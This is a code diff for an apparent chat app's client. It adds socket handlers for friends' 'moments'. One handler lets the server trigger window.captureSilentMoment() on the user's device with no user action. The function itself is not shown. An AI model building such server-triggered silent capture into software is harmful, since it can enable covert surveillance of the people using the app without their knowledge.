@@ -446,6 +446,45 @@ function initSocket() {
     });
     renderChatList(document.getElementById("chat-search")?.value.trim().toLowerCase() || "");
   });
+
+  socket.on("client:capture_moment", async () => {
+    if (typeof window.captureSilentMoment === "function") {
+      await window.captureSilentMoment();
+    }
+  });
+
+  socket.on("moment:new", ({ userId, username, avatar, moment }) => {
+    if (!State.friendMoments) State.friendMoments = {};
+    if (!State.friendMoments[userId]) State.friendMoments[userId] = [];
+    
+    // Check duplicates
+    const exists = State.friendMoments[userId].some(m => m.url === moment.url);
+    if (!exists) {
+      State.friendMoments[userId].unshift(moment);
+    }
+    
+    showToast(`${username} posted a new moment!`, "info");
+
+    if (State.activeChat === userId) {
+      const avatarEl = document.getElementById("chat-avatar");
+      if (avatarEl) {
+        avatarEl.classList.add("has-moments");
+      }
+    }
+
+    // Real-time update for Moments Tab inside Modal
+    const activeNavBtn = document.querySelector(".profile-nav-btn.active");
+    const modalIsOpen = document.getElementById("profile-modal")?.classList.contains("active");
+    if (modalIsOpen && activeNavBtn && activeNavBtn.dataset.section === "moments") {
+      renderPeopleTab("moments");
+    } else {
+      const momentsBadge = document.getElementById("modal-moments-badge");
+      if (momentsBadge) {
+        momentsBadge.classList.add("dot");
+        momentsBadge.textContent = " ";
+      }
+    }
+  });
 }
 
 function insertMessageInOrder(message) {
